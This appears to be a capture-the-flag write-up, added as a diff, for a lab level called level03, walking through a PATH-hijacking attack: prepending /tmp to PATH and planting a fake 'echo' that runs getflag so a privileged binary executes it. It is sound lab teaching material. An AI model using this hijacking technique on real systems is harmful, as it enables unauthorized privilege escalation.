@@ -1,0 +1,21 @@
+There is file level03. We download it with scp -P 4242 level03@192.168.1.78:~/level03 .
+We open it with notepad and we can read "/usr/bin/env echo Exploit me"
+
+We export the $PATH to tmp to be able to add a file.
+
+$ export PATH="/tmp:$PATH"
+
+Before exporting, the $PATH is "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games".
+When we write a command, the shell will search for the executable file in the $PATH.
+It will start looking in "/usr/local/sbin", then "/usr/local/bin"...
+After the export, the $PATH is "/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games".
+Now the shell will look into /tmp first to find the command.
+
+Then we add a file named echo that will execute getflag so when we launch ./level03, echo will be replaced by getflag.
+$ echo "/bin/getflag" > /tmp/echo
+
+We make that file executable
+$ chmod +x /tmp/echo
+
+Then we can launch the level03 executable to get the flag
+$ ./level03 
